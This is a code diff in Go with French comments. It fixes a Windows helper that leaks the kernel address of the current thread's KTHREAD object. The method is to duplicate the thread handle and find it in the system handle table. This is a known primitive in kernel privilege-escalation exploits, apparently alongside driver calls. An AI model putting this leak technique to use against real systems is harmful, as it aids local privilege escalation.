@@ -44,13 +44,31 @@ var (
 	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
 	procDeviceIoControl          = kernel32.NewProc("DeviceIoControl")
 	procCreateFile               = kernel32.NewProc("CreateFileW")
+	procGetCurrentProcess        = kernel32.NewProc("GetCurrentProcess")
+	procGetCurrentThread         = kernel32.NewProc("GetCurrentThread")
+	procDuplicateHandle          = kernel32.NewProc("DuplicateHandle")
 )
 
-// GetCurrentThreadKThreadAddress récupère l'adresse du KTHREAD actuel
+// GetCurrentThreadKThreadAddress récupère l'adresse réelle du thread actuel dans le noyau
 func GetCurrentThreadKThreadAddress() (uintptr, error) {
 	var returnLength uint32
 	pid, _, _ := procGetCurrentProcessId.Call()
-	tid, _, _ := procGetCurrentThreadId.Call()
+
+	// Étape cruciale : Transformer le "pseudo-handle" du thread en un "vrai handle"
+	hProcess, _, _ := procGetCurrentProcess.Call()
+	hThreadPseudo, _, _ := procGetCurrentThread.Call()
+	var hThreadReal uintptr
+
+	// On duplique le handle pour en avoir un "réel" que Windows liste dans sa table
+	procDuplicateHandle.Call(
+		hProcess,
+		hThreadPseudo,
+		hProcess,
+		uintptr(unsafe.Pointer(&hThreadReal)),
+		0,
+		0,
+		2, // DUPLICATE_SAME_ACCESS
+	)
 
 	// STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
 	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
@@ -92,7 +110,8 @@ func GetCurrentThreadKThreadAddress() (uintptr, error) {
 	for i := 0; i < handleCount; i++ {
 		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + uintptr(i)*handleSize))
 
-		if handle.UniqueProcessId == pid && handle.HandleValue == tid {
+		// On cherche l'entrée qui appartient à NOTRE PID et qui a la VALEUR de notre handle dupliqué
+		if handle.UniqueProcessId == pid && handle.HandleValue == hThreadReal {
 			return handle.Object, nil
 		}
 	}
